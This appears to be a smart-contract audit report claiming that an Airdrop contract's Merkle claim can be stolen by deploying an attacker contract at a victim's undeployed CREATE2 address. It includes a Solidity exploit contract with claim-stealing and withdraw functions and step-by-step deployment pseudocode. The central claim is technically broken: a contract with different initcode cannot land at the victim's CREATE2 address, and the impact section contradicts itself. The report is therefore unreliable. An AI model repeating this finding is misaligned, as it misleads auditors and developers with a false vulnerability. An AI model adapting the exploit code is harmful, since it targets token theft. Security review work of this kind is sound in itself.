### Title
CREATE2 Address Squatting Enables Theft of Airdrop Tokens from Undeployed Contract Recipients — (`core/contracts/Airdrop.sol`)

---

### Summary

The `Airdrop` contract transfers tokens unconditionally to `msg.sender` after Merkle proof verification. Because the Merkle leaf encodes only `(address, amount)`, any caller whose address matches a leaf can claim. An attacker who deploys a contract at a victim's not-yet-deployed CREATE2 address can call `claim()` with the victim's public proof, receive the tokens into the attacker-controlled contract, and permanently consume the victim's claim slot.

---

### Finding Description

`_claim` passes `msg.sender` as both the identity for proof verification and the transfer recipient: [1](#0-0) 

The Merkle leaf is constructed solely from `(sender, totalAmount)`: [2](#0-1) 

There is no check that `msg.sender` is the intended beneficiary beyond address equality. If an attacker deploys a contract at `victimAddress` (via CREATE2) before the victim does, then when the attacker's contract calls `claim()`:

- `msg.sender == victimAddress` ✓
- The leaf `keccak256(bytes.concat(keccak256(abi.encode(victimAddress, totalAmount))))` matches the victim's published proof ✓
- `claimed[week][victimAddress]` is set, permanently blocking the victim from ever claiming ✓
- Tokens are transferred to `victimAddress`, which is the attacker's contract ✓

The note in the question about check ordering (`claimed[week][sender] == 0` before proof verification) is a red herring — the ordering is irrelevant to this attack. The root cause is that address equality alone is used as authorization. [3](#0-2) 

---

### Impact Explanation

The victim permanently loses their entire airdrop allocation for the targeted week. The attacker receives the tokens into a contract they control and can withdraw them freely. The `claimed` mapping is set to `totalAmount` for the victim's address, so even if the victim later deploys their own contract at that address (impossible once the attacker occupies it), the claim is consumed.

---

### Likelihood Explanation

Preconditions are specific but realistic:

1. **Victim must be a contract address** — Gnosis Safe, other multisigs, and smart-contract wallets are commonly included in protocol airdrops. Their CREATE2 addresses are deterministic and computable from public parameters (factory address, owners, threshold, standard initcode).
2. **Merkle tree data is public** — Airdrop distributions are published off-chain so users can construct their proofs. The attacker reads `(victimAddress, totalAmount, proof)` directly from the published dataset.
3. **Attacker must deploy before victim** — For a wallet that has never been deployed, the attacker simply needs to act before the victim claims. There is no race condition with the victim's deployment; the attacker just needs to deploy first.

---

### Recommendation

Bind the claim to a signature from the recipient's private key (for EOAs) or require the caller to be the address itself (already satisfied for EOAs, but add an explicit `msg.sender == recipient` check with a signed authorization for contract addresses). Alternatively, restrict airdrop recipients to EOAs only, or require a separate on-chain registration step before the Merkle root is finalized so that only already-deployed addresses are included.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IAirdrop {
    struct ClaimProof { uint32 week; uint256 totalAmount; bytes32[] proof; }
    function claim(ClaimProof[] calldata) external;
}

interface IERC20 { function balanceOf(address) external view returns (uint256); }

// Attacker deploys this contract at the victim's CREATE2 address
// before the victim deploys their own contract.
contract AttackerAtVictimAddress {
    address owner;
    constructor() { owner = msg.sender; }

    function stealClaim(
        address airdrop,
        uint32 week,
        uint256 totalAmount,
        bytes32[] calldata proof
    ) external {
        IAirdrop.ClaimProof[] memory proofs = new IAirdrop.ClaimProof[](1);
        proofs[0] = IAirdrop.ClaimProof(week, totalAmount, proof);
        // msg.sender == address(this) == victimAddress
        // Merkle leaf matches victim's published proof
        IAirdrop(airdrop).claim(proofs);
    }

    function withdraw(address token, address to) external {
        require(msg.sender == owner);
        uint256 bal = IERC20(token).balanceOf(address(this));
        (bool ok,) = token.call(
            abi.encodeWithSignature("transfer(address,uint256)", to, bal)
        );
        require(ok);
    }
}

// Deployer script (Hardhat test pseudocode):
// 1. Compute victimAddress = CREATE2(factory, salt, keccak256(victimInitcode))
// 2. Deploy AttackerAtVictimAddress using CREATE2 with same salt/factory → lands at victimAddress
// 3. Read (week, totalAmount, proof) for victimAddress from published Merkle data
// 4. Call attacker.stealClaim(airdrop, week, totalAmount, proof)
// 5. Assert IERC20(token).balanceOf(victimAddress) == totalAmount  ← attacker holds tokens
// 6. Call attacker.withdraw(token, attackerEOA)
// 7. Assert claimed[week][victimAddress] == totalAmount             ← victim permanently blocked
```
